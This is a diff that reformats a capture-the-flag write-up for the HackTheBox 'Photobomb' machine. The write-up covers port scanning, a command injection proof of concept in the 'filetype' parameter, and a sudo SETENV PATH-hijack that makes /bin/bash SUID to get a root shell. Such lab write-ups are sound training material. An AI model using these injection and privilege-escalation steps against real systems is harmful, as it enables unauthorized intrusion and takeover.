@@ -2,14 +2,15 @@
 
 **Initial Access:**\
 nmap 10.10.11.182 -Pn --min-rate=5000 -p-\
-output shows ports open: 22,80\
-Enumerating those ports further:
+output shows ports open: 22,80
+
+Enumerating these open ports further with nmap:
 ![image](https://user-images.githubusercontent.com/93153300/198094317-0f16d654-f4d6-4cb6-8c48-91f5e4a5db94.png)
  
 nmap shows that 10.10.11.182 tries to rediret to photobomb.htb.  So to make that redirect work add to file /etc/hosts:  10.10.11.182    photobomb.htb 						
 
-Navigate to port 80 site  http://photobomb.htb  → Not much on the site.  	\	
-Site has a ‘click here’ url		 → clicking on it leads to a login page on directory /printer.  	
+Navigate to port 80 site  http://photobomb.htb  → Not much on the site.\
+Site has a ‘click here’ url		 → clicking on it leads to a login page on directory /printer. \
 We don’t have credentials, and trying some default credentials doesn’t work.  \
 Directory brute forcing and wfuzz for subdomains doesn’t lead to anything of interest.  			
 
@@ -35,11 +36,11 @@ Fuzz the 3 parameters shown: photo, filetype, and dimensions. Let’s first fuzz
  
 It seems to indicate possible command injection when it states “Your wish is its command”.  
 
-Proof of concept  for command injection found:	\				
-The command injection is on the ‘filetype’ parameter.   Add after ‘filetype=jpg’ a semicolon and then whatever command you want to run, like so: filetype=jpg;ping 10.10.14.50 -c 4			
+Proof of concept  for command injection found:	\
+The command injection is on the ‘filetype’ parameter.  Add after ‘filetype=jpg’ a semicolon and then whatever command you want to run, like so: filetype=jpg;ping 10.10.14.50 -c 4			
 
-To capture the ping request run in terminal: tcpdump -i tun0 icmp	\		
-In the burp suite capture, make sure to url encode the command.  The parameters with our modification will look like this:	\				
+To capture the ping request run in terminal: tcpdump -i tun0 icmp	\
+In the burp suite capture, make sure to url encode the command.  The parameters with our modification will look like this:	\
 photo=eleanor-brooke-w-TLY0Ym4rM-unsplash.jpg&filetype=jpg;ping+10.10.14.50+-c+4&dimensions=30x20
 
 Send the request in burp suite and we get back ping requests in tcpdump.  
@@ -72,9 +73,9 @@ SETENV can often be exploited.  SETENV means that when you run this sudo command
 
 The find command is not using a complete path, so let’s use SETENV to get root. 
 
-Step 1: create a malicious file and give it the name find → echo -n “chmod 4755 /bin/bash” > /dev/shm/find.  				
-Step 2: give /dev/shm/find executable permissions  →   chmod +x /dev/shm/find	\		
-Step 3: run the sudo command and give it the path to the malicious find command   → sudo PATH=/dev/shm:$PATH /opt/cleanup.sh				
+Step 1: create a malicious file and give it the name find → echo -n “chmod 4755 /bin/bash” > /dev/shm/find.\
+Step 2: give /dev/shm/find executable permissions  →   chmod +x /dev/shm/find \
+Step 3: run the sudo command and give it the path to the malicious find command   → sudo PATH=/dev/shm:$PATH /opt/cleanup.sh \
 Step 4: /bin/bash -p\
 We have shell as root
 ![image](https://user-images.githubusercontent.com/93153300/198095522-9af6c384-0af6-43d5-9532-4bad28584e8d.png)
